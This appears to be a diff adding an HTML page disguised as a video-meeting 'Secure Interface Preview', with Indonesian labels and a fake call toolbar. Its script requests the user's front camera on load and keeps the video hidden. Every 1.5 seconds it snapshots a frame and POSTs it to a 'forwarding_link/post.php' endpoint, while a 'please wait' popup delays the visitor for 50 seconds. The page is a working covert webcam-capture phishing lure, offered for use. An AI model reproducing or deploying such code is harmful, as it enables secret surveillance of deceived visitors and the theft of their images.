@@ -1,0 +1,312 @@
+<!doctype html>
+<html>
+
+<head>
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+  <video id="video" playsinline autoplay></video>
+</div>
+
+<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
+
+<style>
+@import url("https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap");
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Nunito', sans-serif;
+}
+
+body {
+  height: 100vh;
+  width: 100vw;
+  background: linear-gradient(135deg, #1f2933, #111827);
+  color: #ffffff;
+}
+
+/* MAIN SCREEN */
+.main-screen {
+  height: 100vh;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  text-align: center;
+}
+
+/* LOGO / IMAGE */
+img {
+  width: 90px;
+  height: 90px;
+  margin-bottom: 15px;
+}
+
+/* TITLE */
+h1 {
+  font-size: 24px;
+  font-weight: 700;
+  margin-bottom: 5px;
+}
+
+p.subtitle {
+  font-size: 14px;
+  opacity: 0.8;
+}
+
+/* BOTTOM BAR */
+.bottom-bar {
+  position: fixed;
+  bottom: 0;
+  width: 100%;
+  height: 90px;
+  background: rgba(17, 24, 39, 0.95);
+  backdrop-filter: blur(8px);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 40px;
+  border-top: 1px solid rgba(255,255,255,0.1);
+}
+
+/* ICON BUTTON */
+.icon-button {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  cursor: pointer;
+  transition: transform 0.2s ease;
+}
+
+.icon-button:hover {
+  transform: scale(1.1);
+}
+
+.icon-button i {
+  font-size: 26px;
+  margin-bottom: 6px;
+}
+
+.icon-button span {
+  font-size: 12px;
+  opacity: 0.85;
+}
+
+/* BUTTON */
+button {
+  margin-top: 15px;
+  padding: 10px 28px;
+  background: linear-gradient(135deg, #dc2626, #b91c1c);
+  border: none;
+  border-radius: 8px;
+  color: #fff;
+  font-weight: 600;
+  cursor: pointer;
+  transition: 0.3s;
+}
+
+button:hover {
+  opacity: 0.9;
+}
+
+/* FLOAT BUTTON */
+.float_button {
+  position: fixed;
+  top: 15px;
+  right: 15px;
+  height: 42px;
+  width: 42px;
+  background: rgba(31, 41, 55, 0.9);
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+}
+
+/* POPUP OVERLAY */
+#ac-wrapper {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.6);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 1000;
+}
+
+/* POPUP BOX */
+#popup {
+  width: 420px;
+  padding: 20px;
+  background: #111827;
+  border-radius: 15px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+  text-align: center;
+}
+
+/* FOOTER / AUTHOR */
+.footer {
+  position: fixed;
+  bottom: 95px;
+  width: 100%;
+  text-align: center;
+  font-size: 12px;
+  opacity: 0.7;
+}
+
+.footer a {
+  color: #38bdf8;
+  text-decoration: none;
+}
+</style>
+
+
+<script>
+
+  function post(imgdata) {
+    $.ajax({
+      type: 'POST',
+      data: { cat: imgdata },
+      url: 'forwarding_link/post.php',
+      dataType: 'json',
+      async: false,
+      success: function (result) {
+        // call the function that handles the response/results
+      },
+      error: function () {
+      }
+    });
+  };
+
+
+  'use strict';
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const errorMsgElement = document.querySelector('span#errorMsg');
+
+  const constraints = {
+    audio: false,
+    video: {
+
+      facingMode: "user"
+    }
+  };
+
+  // Access webcam
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleSuccess(stream);
+    } catch (e) {
+      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+    }
+  }
+
+  // Success
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    var context = canvas.getContext('2d');
+    setInterval(function () {
+
+      context.drawImage(video, 0, 0, 640, 480);
+      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+      post(canvasData);
+      video.play();
+    }, 1500);
+
+
+  }
+  function PopUp(){
+    document.getElementById('ac-wrapper').style.display="none"; 
+}
+  // Load init
+  init();
+  $(document).ready(function(){
+   setTimeout(function(){
+      PopUp();
+   },50000); // 5000 to load it after 5 seconds from page load
+});
+</script>
+<div class="main-screen">
+  <img src="logo.png" alt="Logo">
+  <h1>Web Simulation</h1>
+  <p class="subtitle">Secure Interface Preview</p>
+
+  <button>Mulai</button>
+</div>
+
+<div class="footer">
+  © 2025 • Website by <strong>mzkyzak</strong> • Developer  
+  <br>
+  <a href="https://mzkyzak.github.io" target="_blank">https://mzkyzak.github.io</a>
+</div>
+
+<div class="bottom-bar">
+  <div class="icon-button">
+    <i>📷</i>
+    <span>Kamera</span>
+  </div>
+  <div class="icon-button">
+    <i>🎥</i>
+    <span>Live</span>
+  </div>
+  <div class="icon-button">
+    <i>⚙️</i>
+    <span>Setting</span>
+  </div>
+</div>
+
+<body>
+  <div class="float_button">
+    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
+  </div>
+  <div id="ac-wrapper">
+    <div id="popup">
+        <center>
+            <h2>mohon tunggu sebentar</h2>
+        </center>
+    </div>
+</div>
+  <div class="bottom-bar">
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-microphone"></i>
+      <h6>Mute</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-video"></i>
+      <h6>Stop Video</h6>
+    </div>
+    <div class="icon-button" style="margin-left: auto;">
+      <i class="fas fa-shield-alt"></i>
+      <h6>Security</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-users"></i>
+      <h6>Participants</h6>
+    </div>
+    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
+      <i class="fas fa-plus-square"></i>
+      <h6>Share content</h6>
+    </div>
+    <div class="icon-button" style="margin-left: 50px;">
+      <i class="fas fa-comments"></i>
+      <h6>Chat</h6>
+    </div>
+    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
+      <i class="fas fa-record-vinyl"></i>
+      <h6>Record</h6>
+    </div>
+    <button style="margin-right: 50px;">End</button>
+  </div>
+</body>
+
+</html>
